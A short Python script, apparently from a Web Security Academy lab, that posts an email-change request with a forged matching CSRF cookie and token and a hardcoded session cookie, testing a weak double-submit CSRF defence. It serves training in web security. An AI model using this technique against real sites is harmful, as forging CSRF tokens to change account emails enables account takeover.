import requests

s = requests.Session()
url = "https://0a8c009004e8ac99c0ff440200bf00da.web-security-academy.net/"

cookies = {
	"session": "aw99mrIClrfxISJHWOL69QUpYAjFJuG4; ",
	"csrf": "qwerasdf"
}

data = {
	"email": "test@test2.com",
	"csrf": "qwerasdf"
}
r = s.post(url + "my-account/change-email", data=data, cookies=cookies)
# r = s.get(url + "/my-account", cookies=cookies)
print(r.text)